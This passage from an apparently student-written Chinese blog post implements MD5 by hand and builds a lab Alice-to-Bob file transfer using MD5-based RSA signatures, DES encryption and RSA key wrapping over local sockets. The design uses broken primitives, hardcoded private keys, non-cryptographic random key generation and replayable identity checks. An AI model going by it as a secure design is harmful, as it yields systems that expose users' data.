    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x)):
        res += <span class="hljs-built_in">str</span>((<span class="hljs-built_in">int</span>(x[i], <span class="hljs-number">2</span>) + <span class="hljs-number">1</span>) % <span class="hljs-number">2</span>)
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 实现x的循环左移</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shift</span>(<span class="hljs-params">x, i</span>):</span>
    res = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x) - i):
        res = res + x[t + i:t + i + <span class="hljs-number">1</span>]   <span class="hljs-comment"># 先保存 x[i:]  再保存x[:i]</span>
    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, i):
        res = res + x[y:y + <span class="hljs-number">1</span>]
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 实现整数模2的三十二次方加法</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">x, y</span>):</span>
    a = <span class="hljs-built_in">int</span>(x,<span class="hljs-number">2</span>)  <span class="hljs-comment">#先将二进制转换成十进制</span>
    b = <span class="hljs-built_in">int</span>(y,<span class="hljs-number">2</span>)
    res = (a + b)%(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>)
    res = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(res)[<span class="hljs-number">2</span>:])
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(res) != <span class="hljs-number">32</span>:    <span class="hljs-comment"># 补充到32位</span>
        res = (<span class="hljs-number">32</span>-<span class="hljs-built_in">len</span>(res))*<span class="hljs-string">&#x27;0&#x27;</span>+res
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 定义f,g,h,i函数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ffunc</span>(<span class="hljs-params">x, y, z</span>):</span>  <span class="hljs-comment"># ((x&amp;y)|((~x)&amp;z))</span>
    t = and1(x, y)
    t1 = reverse(x)
    t2 = and1(t1, z)
    <span class="hljs-keyword">return</span> or1(t, t2)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gfunc</span>(<span class="hljs-params">x, y, z</span>):</span>  <span class="hljs-comment"># ((x&amp;z)|(y&amp;(~z)))</span>
    t = and1(x, z)
    t1 = reverse(z)
    t2 = and1(y, t1)
    <span class="hljs-keyword">return</span> or1(t, t2)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hfunc</span>(<span class="hljs-params">x, y, z</span>):</span> <span class="hljs-comment"># (x^y^z)</span>
    t1 = xor(x, y)
    t2 = xor(t1, z)
    <span class="hljs-keyword">return</span> t2

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ifunc</span>(<span class="hljs-params">x, y, z</span>):</span> <span class="hljs-comment"># (y^(x|(~z)))</span>
    t = reverse(z)
    t1 = or1(x, t)
    <span class="hljs-keyword">return</span> xor(y, t1)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span>(<span class="hljs-params">text</span>):</span>
    text1 = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> text:
        t = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(i))
        t = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(t, <span class="hljs-number">10</span>))[<span class="hljs-number">2</span>:])
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(t) &lt; <span class="hljs-number">8</span>:                 <span class="hljs-comment"># 将每个字符转换成8位二进制数</span>
            <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(t)):
                t = <span class="hljs-string">&#x27;0&#x27;</span> + t
        text1 = text1 + t
    length = <span class="hljs-built_in">len</span>(text1)
    length1 = <span class="hljs-number">512</span> - <span class="hljs-built_in">len</span>(text1) - <span class="hljs-number">65</span>    <span class="hljs-comment"># length1是要填充0的位数</span>
    text1 = text1 + <span class="hljs-string">&#x27;1&#x27;</span>                <span class="hljs-comment"># 第一位添加 0</span>
    text1 = text1 + <span class="hljs-string">&#x27;0&#x27;</span>*length1        <span class="hljs-comment"># 将其补充到 N*512+448  N可以为0</span>
    text2 = <span class="hljs-built_in">bin</span>(length)[<span class="hljs-number">2</span>:]            <span class="hljs-comment"># 将字符长度转换成二进制数</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(text2) &lt; <span class="hljs-number">8</span>:                 <span class="hljs-comment">#  填充后面64位,先填充字符串的长度,再补0</span>
        text2 = <span class="hljs-string">&#x27;0&#x27;</span>*(<span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(text2)) + text2

    length2 = <span class="hljs-number">64</span> - <span class="hljs-built_in">len</span>(text2)
    text2 = text2 + <span class="hljs-string">&#x27;0&#x27;</span>*length2        <span class="hljs-comment"># 填充后面64位,先填充字符串的长度,再补0</span>
    <span class="hljs-keyword">return</span> text1 + text2

<span class="hljs-comment"># 将最后得到的ABCD逆序输出  最后一步使用</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse_order</span>(<span class="hljs-params">a</span>):</span>
    res = a[<span class="hljs-number">24</span>:<span class="hljs-number">32</span>] + a[<span class="hljs-number">16</span>:<span class="hljs-number">24</span>] + a[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>] + a[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>]
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 输入要加密的明文</span>
password = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要加密的信息:&quot;</span>)
<span class="hljs-comment"># 填充算法</span>
x = fill(password)


j = <span class="hljs-number">0</span>
M = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(x),<span class="hljs-number">32</span>):   <span class="hljs-comment"># 将512位分成十六组</span>
    M.append(x[i:i+<span class="hljs-number">32</span>])
    M[j] = M[j][<span class="hljs-number">24</span>:<span class="hljs-number">32</span>] + M[j][<span class="hljs-number">16</span>:<span class="hljs-number">24</span>] + M[j][<span class="hljs-number">8</span>:<span class="hljs-number">16</span>] + M[j][<span class="hljs-number">0</span>:<span class="hljs-number">8</span>]
    j+=<span class="hljs-number">1</span>

<span class="hljs-comment"># md5算法的第一步</span>
A,B,C,D= A0,B0,C0,D0  <span class="hljs-comment">#为第五步 相加原始的A,B,C,D做备份</span>

<span class="hljs-comment"># md5算法的第二步</span>
AA,BB,CC,DD = A,B,C,D

<span class="hljs-comment"># md5算法的第三步</span>
<span class="hljs-comment"># 第一轮     每轮A,B,C,D都处理四次，四轮就是十六次，一共六十四次</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):                  <span class="hljs-comment"># f函数</span>
    A = add(B, shift(add(A, add(add(ffunc(B, C, D), M[<span class="hljs-number">4</span>*i]), Ti[<span class="hljs-number">4</span> * i])), <span class="hljs-number">7</span>))
    D = add(A, shift(add(D, add(add(ffunc(A, B, C), M[<span class="hljs-number">4</span>*i+<span class="hljs-number">1</span>]), Ti[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>])), <span class="hljs-number">12</span>))
    C = add(D, shift(add(C, add(add(ffunc(D, A, B), M[<span class="hljs-number">4</span>*i+<span class="hljs-number">2</span>]), Ti[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>])), <span class="hljs-number">17</span>))
    B = add(C, shift(add(B, add(add(ffunc(C, D, A), M[<span class="hljs-number">4</span>*i+<span class="hljs-number">3</span>]), Ti[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>])), <span class="hljs-number">22</span>))

<span class="hljs-comment"># 第二轮</span>
k = <span class="hljs-number">1</span>
j = <span class="hljs-number">16</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
    A = add(B, shift(add(A, add(add(gfunc(B, C, D), M[(k+<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*i))%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span>])), <span class="hljs-number">5</span>))
    D = add(A, shift(add(D, add(add(gfunc(A, B, C), M[(k+<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*i+<span class="hljs-number">1</span>))%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">1</span>])), <span class="hljs-number">9</span>))
    C = add(D, shift(add(C, add(add(gfunc(D, A, B), M[(k+<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*i+<span class="hljs-number">2</span>))%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">2</span>])), <span class="hljs-number">14</span>))
    B = add(C, shift(add(B, add(add(gfunc(C, D, A), M[(k+<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*i+<span class="hljs-number">3</span>))%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">3</span>])), <span class="hljs-number">20</span>))

<span class="hljs-comment"># 第三轮</span>
k = <span class="hljs-number">5</span>
j = <span class="hljs-number">32</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
    A = add(B, shift(add(A, add(add(hfunc(B, C, D), M[(k+i*<span class="hljs-number">4</span>*<span class="hljs-number">3</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span>])), <span class="hljs-number">4</span>))
    D = add(A, shift(add(D, add(add(hfunc(A, B, C), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">1</span>)*<span class="hljs-number">3</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">1</span>])), <span class="hljs-number">11</span>))
    C = add(D, shift(add(C, add(add(hfunc(D, A, B), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">2</span>)*<span class="hljs-number">3</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">2</span>])), <span class="hljs-number">16</span>))
    B = add(C, shift(add(B, add(add(hfunc(C, D, A), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">3</span>)*<span class="hljs-number">3</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">3</span>])), <span class="hljs-number">23</span>))

<span class="hljs-comment"># 第四轮</span>
k = <span class="hljs-number">0</span>
j = <span class="hljs-number">48</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
    A = add(B, shift(add(A, add(add(ifunc(B, C, D), M[(k+(i*<span class="hljs-number">4</span>)*<span class="hljs-number">7</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span>])), <span class="hljs-number">6</span>))
    D = add(A, shift(add(D, add(add(ifunc(A, B, C), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">1</span>)*<span class="hljs-number">7</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">1</span>])), <span class="hljs-number">10</span>))
    C = add(D, shift(add(C, add(add(ifunc(D, A, B), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">2</span>)*<span class="hljs-number">7</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">2</span>])), <span class="hljs-number">15</span>))
    B = add(C, shift(add(B, add(add(ifunc(C, D, A), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">3</span>)*<span class="hljs-number">7</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">3</span>])), <span class="hljs-number">21</span>))
<span class="hljs-comment"># 第五步  将计算出的A,B,C,D与初始的相加，并赋值</span>
A,B,C,D = add(A, AA),add(B, BB),add(C, CC),add(D, DD)
<span class="hljs-comment"># 输出得到的密文</span>

ciphertext = reverse_order(A) + reverse_order(B) + reverse_order(C) + reverse_order(D)
cipher = ciphertext
ciphertext = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(ciphertext, <span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:])   <span class="hljs-comment"># 将二进制数转换为十六进制数</span>
ciphertext = <span class="hljs-string">&#x27;0&#x27;</span>*(<span class="hljs-number">32</span>-<span class="hljs-built_in">len</span>(ciphertext))+ciphertext <span class="hljs-comment"># 为了避免第一个数字为零时无法显示出来</span>
print(<span class="hljs-string">&quot;hash值(小写):&quot;</span>,ciphertext)
print(<span class="hljs-string">&quot;hash值(大写):&quot;</span>,ciphertext.upper())

</code></pre>





<h1 id="六、综合实验"><a href="#六、综合实验" class="headerlink" title="六、综合实验"></a>六、综合实验</h1><h3 id="6-1-实验内容"><a href="#6-1-实验内容" class="headerlink" title="6.1 实验内容"></a>6.1 实验内容</h3><p>现在，Alice想通过公共信道给Bob传输一份秘密文件（文件非常大）。又知道，很多人和机构想得到这份文件。需要设计一个通信模型，来保证文件的机密性和完整性。</p>
<p>  现在很多人想要得到这份文件，那么，可能会有很多人在假冒Bob的身份，来请求得到这个文件，需要对Bob身份进行验证；也有可能是很多人得不到文件，就假冒Alice的身份，想要给Bob发送文件，如果有人发送恶意文件给Bob，Bob发现不是想要的文件，但这个文件给Bob电脑安装了后门，等他接受了正确的文件，就存在泄漏的风险，所以需要对Alice身份进行验证。</p>
<h3 id="6-2-分析实验需求"><a href="#6-2-分析实验需求" class="headerlink" title="6.2 分析实验需求"></a>6.2 分析实验需求</h3><p>现在很多人想要得到这份文件，那么，可能会有很多人在假冒Bob的身份，来请求得到这个文件，需要对Bob身份进行验证；也有可能是很多人得不到文件，就假冒Alice的身份，想要给Bob发送文件，如果有人发送恶意文件给Bob，Bob发现不是想要的文件，但这个文件给Bob电脑安装了后门，等他接受了正确的文件，就存在泄漏的风险，所以需要对Alice身份进行验证。</p>
<p><strong>根据分析，所得结果如下:</strong></p>
<ol>
<li><p>传输的是秘密文件，所以可能存在人冒充bob接收文件，所以Alice在与传输文件之前需要对bob的身份进行认证，而且bob防止被欺骗也需要对Alice的身份进行认证，这里可以采用第二类签名算法。</p>
</li>
<li><p>在确认彼此身份后需要将文件通过公共信道传输，但是可能存在攻击人劫持，所以需要对文件内容加密，而文件内容很大，考虑到加密速度问题，所以采用对称加密算法。</p>
</li>
<li><p>采用对称加密算法需要密钥，而这里使用随机生成的密钥。并且这个密钥也需要传给bob用于解密，但是公共信道不安全，所以也需要对该密钥进行加密。考虑到密钥长度不是很大，所以可以采用公钥加密算法，而且公钥加密算法可以解决传输此次加密使用的密钥，提高安全性和效率。</p>
</li>
<li><p>Bob收到密文和加密后的密钥，使用自己的私钥解密出对称加密算法使用的密钥，然后使用密钥解密密文后向Alice发送确认消息，确保bob收到消息。</p>
</li>
<li><p>确认消息也要使用到第一步使用的签名算法。</p>
</li>
</ol>
<h3 id="6-3-程序流程图"><a href="#6-3-程序流程图" class="headerlink" title="6.3 程序流程图"></a>6.3 程序流程图</h3><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210202142616269.png" alt="image-20210202142616269"></p>
<h3 id="6-4-完整代码"><a href="#6-4-完整代码" class="headerlink" title="6.4 完整代码"></a>6.4 完整代码</h3><p>Alice</p>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/1/3 23:17</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : Alice.py</span>

<span class="hljs-keyword">from</span> RSA <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> DES <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> file_decode <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> socket

n_bob = <span class="hljs-number">81836285346168841919828227774710209132464519960137459236348092425786962849543</span>
n = <span class="hljs-number">44531776921047477359676235110843825307036514195195627878765712056028758572817</span>
d = <span class="hljs-number">34159352569920789505556306994405309761109146525598570740717995833480670158209</span>
e = <span class="hljs-number">65537</span>

name = <span class="hljs-string">&quot;This is alice.&quot;</span>

client = socket.socket()
client.connect((<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">8888</span>))  <span class="hljs-comment"># 本机地址和端口</span>

data = client.recv(<span class="hljs-number">1024</span>)
print(<span class="hljs-built_in">str</span>(data, <span class="hljs-string">&quot;utf-8&quot;</span>),end=<span class="hljs-string">&quot;&quot;</span>)
client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)
print(<span class="hljs-string">&quot;等待bob验证自身身份...&quot;</span>)

<span class="hljs-comment"># alice送出自己的身份信息和签名值</span>
client.send(<span class="hljs-built_in">bytes</span>(name,<span class="hljs-string">&#x27;utf-8&#x27;</span>))             <span class="hljs-comment"># alice发送身份明文信息</span>
client.recv(<span class="hljs-number">1024</span>).decode()
hash_name = md5(name)
crpto_name = <span class="hljs-built_in">str</span>(RSAEncode(hash_name, d, n)) <span class="hljs-comment"># 发送对hash值加密后的值</span>
crpto_name = <span class="hljs-built_in">bytes</span>(crpto_name,<span class="hljs-string">&#x27;utf-8&#x27;</span>)
client.send(crpto_name)

print(client.recv(<span class="hljs-number">1024</span>).decode())             <span class="hljs-comment"># 接收身份认证的结果</span>
<span class="hljs-comment">#接收bob身份hash并验证</span>
print(<span class="hljs-string">&quot;验证bob身份...&quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)
a=<span class="hljs-built_in">input</span>()

bob_name = client.recv(<span class="hljs-number">512</span>).decode()          <span class="hljs-comment"># bob发送过来的身份明文信息</span>
client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)

hash_name = client.recv(<span class="hljs-number">512</span>).decode()         <span class="hljs-comment"># bob使用自己的私钥加密身份明文信息hash值后的值</span>
plain_text = RSADecode(<span class="hljs-built_in">int</span>(hash_name),e,n_bob) <span class="hljs-comment"># 使用bob的公钥解密上一步的值</span>

client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)
<span class="hljs-keyword">if</span> plain_text == md5(bob_name):          <span class="hljs-comment"># 验证是不是bob</span>
    print(bob_name)
    print(<span class="hljs-string">&quot;验证通过!&quot;</span>)
<span class="hljs-keyword">else</span>:
    exit(<span class="hljs-string">&quot;验证错误!&quot;</span>)


<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
    a = <span class="hljs-built_in">input</span>()
    bin_key = gen_key()         <span class="hljs-comment"># 随机生成64位的 DES加密明文使用的密钥</span>
    int_key = <span class="hljs-built_in">int</span>(bin_key,<span class="hljs-number">2</span>)    <span class="hljs-comment"># 将其转换为十进制数，便于后面使用RSA算法加密</span>
    print(<span class="hljs-string">&quot;随机产生对称密钥:&quot;</span>,int_key)  <span class="hljs-comment"># 每次传输随机产生一个密钥更加安全</span>

    plain = read_file()    <span class="hljs-comment"># 读取文件内容</span>
    bin_cipher = DES_encode(plain, bin_key) <span class="hljs-comment"># 使用DES算法加密内容</span>

    a = <span class="hljs-built_in">input</span>()
    int_key = fast_mod(int_key,e,n_bob)   <span class="hljs-comment"># 加密DES的密钥 e是bob的公钥</span>
    print(<span class="hljs-string">&quot;加密对称密钥&quot;</span>)

    print(<span class="hljs-string">&quot;传输密钥...&quot;</span>)               <span class="hljs-comment"># 传输加密后DES密钥</span>
    client.sendall(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(int_key),<span class="hljs-string">&quot;utf-8&quot;</span>))
    client.recv(<span class="hljs-number">512</span>)

    length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bin_cipher))     <span class="hljs-comment"># 传输发送内容的长度</span>
    length = <span class="hljs-built_in">bytes</span>(length,<span class="hljs-string">&quot;utf-8&quot;</span>)    <span class="hljs-comment"># 方便其接收</span>
    client.send(length)

    print(<span class="hljs-string">&quot;传输密文...&quot;</span>)
    client.sendall(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(bin_cipher),<span class="hljs-string">&quot;utf-8&quot;</span>)) <span class="hljs-comment">#发送密文</span>
    message = client.recv(<span class="hljs-number">512</span>).decode()
    client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)
    crypt_message = client.recv(<span class="hljs-number">512</span>).decode()
    hash_message = RSADecode(<span class="hljs-built_in">int</span>(crypt_message),e,n_bob)
    <span class="hljs-keyword">if</span> hash_message == md5(message):
        print(message)
    print(<span class="hljs-string">&quot;文件传输结束！&quot;</span>)
    <span class="hljs-keyword">break</span>
client.close()</code></pre>



<p>Bob</p>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/1/3 23:17</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : bob.py</span>

<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> libnum
<span class="hljs-keyword">from</span> RSA <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> DES <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *

name = <span class="hljs-string">&quot;This is bob.&quot;</span>


n = <span class="hljs-number">81836285346168841919828227774710209132464519960137459236348092425786962849543</span>
n_alice = <span class="hljs-number">44531776921047477359676235110843825307036514195195627878765712056028758572817</span>
d = <span class="hljs-number">39540198292360595989919600111176873707392294831248672388670326288876701993673</span>
e = <span class="hljs-number">65537</span>

<span class="hljs-comment"># e_alice = 2081</span>

server = socket.socket() <span class="hljs-comment">#创建对象</span>
server.bind((<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">8888</span>))<span class="hljs-comment">#绑定 ip和端口</span>
server.listen()  <span class="hljs-comment">#监听</span>
<span class="hljs-comment">#等待连接</span>
print(<span class="hljs-string">&#x27;Waiting connection...&#x27;</span>)
<span class="hljs-comment">#接受请求，返回套接字对象和IP+端口号</span>
con,addr = server.accept()
con.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;Welcome connect!\n开始加密传输:\n&quot;</span>,<span class="hljs-string">&quot;utf-8&quot;</span>))
con.recv(<span class="hljs-number">1024</span>)

<span class="hljs-comment"># 验证alice身份</span>
print(<span class="hljs-string">&quot;验证alice身份...&quot;</span>)
a = <span class="hljs-built_in">input</span>()
alice_name = con.recv(<span class="hljs-number">512</span>).decode()  <span class="hljs-comment"># alice 的明文信息</span>
con.send(<span class="hljs-string">b&#x27;1&#x27;</span>)
hash_name = con.recv(<span class="hljs-number">512</span>).decode()   <span class="hljs-comment"># alice 用私钥加密明文的hash值</span>
plain_text = RSADecode(<span class="hljs-built_in">int</span>(hash_name),e,n_alice) <span class="hljs-comment"># 用alice 的公钥解密出hash值</span>
<span class="hljs-keyword">if</span> plain_text == md5(alice_name):   <span class="hljs-comment"># 判断上一步的值与md5函数加密是否相同</span>
    print(alice_name)               <span class="hljs-comment"># 如果二者相同则可以保证对方是alice,这里的安全性是由公钥算法和hash函数保证</span>
    print(<span class="hljs-string">&quot;验证通过！&quot;</span>)               <span class="hljs-comment"># 因为只有alice有自己的私钥，hash函数的存在防止伪造明文攻击</span>
    con.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;您通过了验证!&quot;</span>,<span class="hljs-string">&quot;utf-8&quot;</span>))
<span class="hljs-keyword">else</span>:
    exit(<span class="hljs-string">&quot;这不是alice,验证错误！&quot;</span>)
<span class="hljs-comment">#送出自己的身份信息和签名值</span>
print(<span class="hljs-string">&quot;等待alice验证自身身份...&quot;</span>)

con.send(<span class="hljs-built_in">bytes</span>(name,<span class="hljs-string">&#x27;utf-8&#x27;</span>))    <span class="hljs-comment"># 向alice发送身份信息的明文</span>
con.recv(<span class="hljs-number">1024</span>).decode()

hash_name = md5(name)            <span class="hljs-comment"># 明文信息的hash值</span>
crpto_name = <span class="hljs-built_in">str</span>(RSAEncode(hash_name, d, n))  <span class="hljs-comment"># 使用自己的私钥加密上一步的hash值</span>
crpto_name = <span class="hljs-built_in">bytes</span>(crpto_name,<span class="hljs-string">&#x27;utf-8&#x27;</span>)        <span class="hljs-comment"># 发送给alice</span>
con.send(crpto_name)
con.recv(<span class="hljs-number">1024</span>)

<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
    data = con.recv(<span class="hljs-number">1024</span>)    <span class="hljs-comment"># 接收alice发送的使用公钥算法加密后的DES的密钥</span>
    data = data.decode()
    int_key = <span class="hljs-built_in">int</span>(data)
    print(<span class="hljs-string">&quot;被加密后的密钥:&quot;</span>,int_key)
    int_key = fast_mod(int_key, d, n)  <span class="hljs-comment"># 使用私钥d解密出DES密钥</span>
    print(<span class="hljs-string">&quot;解密后的密钥&quot;</span>, int_key)

    print(<span class="hljs-string">&quot;----&quot;</span>*<span class="hljs-number">10</span>)         <span class="hljs-comment"># 接收密文的长度（为了方便存储）</span>
    con.send(<span class="hljs-string">b&#x27;1&#x27;</span>)
    length = con.recv(<span class="hljs-number">1024</span>)
    length = <span class="hljs-built_in">int</span>(length.decode())
    buff = []
    size = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> size &lt; length:    <span class="hljs-comment"># 开始接受密文</span>
        dat = con.recv(<span class="hljs-number">1024</span>)
        size += <span class="hljs-built_in">len</span>(dat.decode())
        buff.append(dat)
    data = <span class="hljs-string">b&#x27;&#x27;</span>.join(buff)
    bin_cipher = data.decode()

    cipher = bin_to_str(bin_cipher)
    bin_key = <span class="hljs-built_in">bin</span>(int_key)[<span class="hljs-number">2</span>:]      <span class="hljs-comment"># 将密钥转换成二进制数</span>
    print(<span class="hljs-string">&quot;解密传输内容:&quot;</span>)
    print(libnum.b2s(DES_decode(cipher, bin_key))) <span class="hljs-comment">#打印出解密后的明文</span>
    message = <span class="hljs-string">&quot;Bob received the file successfully!&quot;</span>
    con.send(<span class="hljs-built_in">bytes</span>(message,<span class="hljs-string">&#x27;utf-8&#x27;</span>))
    con.recv(<span class="hljs-number">1024</span>).decode()
    hash_message = md5(message)
    crypt_message = <span class="hljs-built_in">str</span>(RSAEncode(hash_message,d,n))
    con.send(<span class="hljs-built_in">bytes</span>(crypt_message,<span class="hljs-string">&#x27;utf-8&#x27;</span>))
    <span class="hljs-keyword">break</span>

server.close()</code></pre>



<p>file_decode</p>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/1/3 23:17</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : file_decode.py</span>


<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">from</span> RSA <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> DES <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_key</span>():</span>  <span class="hljs-comment"># 生成64位的对称加密的密钥</span>
    <span class="hljs-built_in">list</span> = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):
        c = random.choice([<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>])
        <span class="hljs-built_in">list</span>.append(c)
    res = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">list</span>)
    <span class="hljs-keyword">return</span> res

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_file</span>():</span>
    <span class="hljs-keyword">try</span>:
        f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;text.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>, encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span>)
        text = f.read()
        f.close()
        print(<span class="hljs-string">&quot;读取成功!&quot;</span>)
        <span class="hljs-keyword">return</span> text
    <span class="hljs-keyword">except</span> IOError:
        print(<span class="hljs-string">&quot;读取错误!&quot;</span>)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bin_to_str</span>(<span class="hljs-params">bin_str</span>) :</span>   <span class="hljs-comment"># 8位二进制转字符，用于bob收到密后使用</span>
    res = <span class="hljs-string">&quot;&quot;</span>
    tmp = re.findall(<span class="hljs-string">r&#x27;.&#123;8&#125;&#x27;</span>,bin_str)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp :
        res += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">2</span>))
    <span class="hljs-keyword">return</span> res</code></pre>

]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>古典密码</tag>
        <tag>DES</tag>
        <tag>RSA</tag>
        <tag>MD5</tag>
      </tags>
  </entry>
  <entry>
